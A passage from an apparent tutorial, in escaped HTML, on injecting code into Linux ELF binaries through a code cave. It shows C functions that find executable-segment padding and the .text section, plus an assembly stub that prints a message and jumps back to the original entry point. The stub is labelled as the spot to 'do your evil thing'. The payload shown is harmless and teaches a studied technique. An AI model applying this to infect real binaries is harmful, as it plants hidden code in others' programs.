&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_txt_seg_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_codecave(data, tsize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;txt_end, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cave_size);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; t_txt_seg_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_vaddr;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;find_codecave&lt;/code&gt; function will go through all the ELF segments and try to find a padding between the two &lt;code&gt;LOAD&lt;/code&gt; segments that we have discussed earlier. It returns a pointer to the first LOAD segment structure that we will need later. It also returns the offset in the file to the padding and it’s size.&lt;/p&gt;
&lt;p&gt;After we get all of that, we store the base virtual address where the code will be loaded into memory for that specific segment. This is usually &lt;code&gt;0x400000&lt;/code&gt;, but I wanted to be sure about this.
The &lt;code&gt;find_codecave&lt;/code&gt; function looks like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Elf64_Phdr&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_codecave&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr_elf, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fsize, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cave_size) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Declare the needed variables.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Calculate the elf segment ptr.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Get the total number of segments.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ehdr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ptr_elf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;txt_segment, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ehdr&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phoff);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; total_segments &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; codecave &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fsize;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Traverse all the segments with type of PT_LOAD.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Get a pointer to the entry and the offset ,of the one with execute permissions.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Find codecave between the 2 segments.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; total_segments; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// printf(&amp;#34;[%d] V_addr: %x\n&amp;#34;, i, elf_segment-&amp;gt;p_vaddr + elf_segment-&amp;gt;p_filesz);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; PT_LOAD &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_flags &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] (#%d) LOAD segment found w execute flag (%d bytes).&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, i, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			txt_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			txt_end		&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; PT_LOAD &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; txt_end) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; codecave )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] (#%d) LOAD segment that can be injected found (%d bytes) near .text at offset: %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					   i, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_filesz, (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				codecave &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_segment&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;p_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Phdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)elf_segment &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_phentsize);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; txt_end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cave_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; codecave;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; txt_segment;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I know this looks very intimidating at first but it’s not that hard after all. We basically take 4 arguments: the first is the pointer from the beginning of our file &lt;em&gt;(the one that we used to retrieve the elf header)&lt;/em&gt;, the second is just the file size and the last 2 are there just for retrieving back to the main program the offset to the padding and its size.&lt;/p&gt;
&lt;p&gt;So, after we have the elf header we can calculate the pointer to the program header table that stores all of our segments. We get the total number of segments by accessing the &lt;code&gt;e_phnum&lt;/code&gt; attribute.
Then, we just traverse all of the segments looking for a segment of type &lt;code&gt;PT_LOAD&lt;/code&gt; with read/execute permissions. Normally, there is only one and it’s containing the &lt;code&gt;.text&lt;/code&gt; section which contains the application code. When we find it, we store a pointer to it that we will return later and also calculate the offset to the end of the .text section.
Then we keep looking for segments with type &lt;code&gt;PT_LOAD&lt;/code&gt; and we calculate the padding between the 2 ones.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Normally there are only 2 &lt;code&gt;PT_LOAD&lt;/code&gt; segments, so this function can be improved. I will let this as an exercise for the reader. 😀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;the-payload&#34;&gt;The Payload&lt;/h2&gt;
&lt;p&gt;It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated for the reader, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;section .text
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    global _start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; save cpu state
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   push rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; your evil thing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;             ; syscall number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rdi, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;             ; fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;(stdout)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lea rsi, [rel msg]     ; pointer to &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; [])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rdx, msg_end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; msg ; size
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   syscall                ; ( SYS_write &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rax(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), buff &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsi(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;msg), size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx(len(msg)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; restore cpu state
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   pop rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   ;; jump to main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mov rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1111111111111111&lt;/span&gt;    ; set rax back to normal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   jmp rax                        ; jump to it
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;align &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   msg      db &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;... &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; ..&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.. .. &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; . &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. ... . &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;.. . .&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;. .. &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;. .... &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;··&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;··&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xae&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   msg_end  db &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ok, we just push everything to the stack, so we can get back the original state of the registers. Then we initialize the arguments on the specific registers making the system call afterwards. We restore the registers &lt;em&gt;(as we pushed them in the first place)&lt;/em&gt; and then set rax to the initial entry point of the program and jump to it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: We placed a placeholder there (&lt;code&gt;0x1111111111111111&lt;/code&gt;), so we can modify it from the injector script later.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;retrieving-the-payload&#34;&gt;Retrieving the payload&lt;/h3&gt;
&lt;p&gt;In order to retrieve the payload, we first need to find the .text section where the code resides. This is done via the &lt;code&gt;find_section&lt;/code&gt; function that takes as arguments a pointer to the start of the file and the section we want to search for.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p_txt_sec_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_section(data1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.text&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function gets the elf header using the pointer passed as the first argument and then calculates the start of the Section Program Header. Thus we get a pointer to it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Elf64_Shdr&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;find_section&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr_elf, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;query) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Set up the ptr to the elf header, section table.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Also, get the total numbers of sections and declare var for the section name.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ehdr 	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) ptr_elf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;elf_sec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(ptr_elf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shoff);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; total_sec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shnum;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sname;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
